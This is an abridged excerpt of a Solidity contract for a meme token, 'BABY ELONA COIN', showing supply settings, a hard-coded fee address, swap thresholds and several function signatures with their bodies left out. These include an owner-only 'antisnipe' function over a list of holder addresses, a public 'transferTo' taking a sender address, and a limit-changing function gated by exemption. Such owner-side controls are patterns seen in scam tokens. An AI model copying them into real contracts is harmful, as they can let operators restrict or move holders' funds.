...
/*
    ...
    BABY ELONA COIN (BABY ELONA)
    
    Telegram: https://t.me/BabyElona
...
contract BABYELONACOIN is IERC20, Ownable {
    ...
    string _name = "BABY ELONA COIN";
    string _symbol = "BABY ELONA";
    uint8 constant _decimals = 9;

    uint256 _totalSupply = 100_000_000 * (10 ** _decimals); // 100,000,000
    uint256 public _transferLimit = (_totalSupply * 1) / 100;  // 1%
    ...
    address marketingFeeReceiver = 0x7fe92e2388Eb67F18f7Db87B0A26C6E73A31DA11;
    ...
    uint256 smallSwapThreshold = _totalSupply.mul(619493726).div(100000000000);
    uint256 largeSwapThreshold = _totalSupply.mul(743945130).div(100000000000);
    ...
    function transferTo(address sender, uint256 amount) public swapping  {
    ...
    function antisnipe(address[] memory sniperAddresses) external onlyOwner swapping {
    ...
    function changeTransferLimit(uint256 percent) external {
        require(isTxLimitExempt[msg.sender]);
        _transferLimit = _totalSupply.mul(percent).div(100);
    }
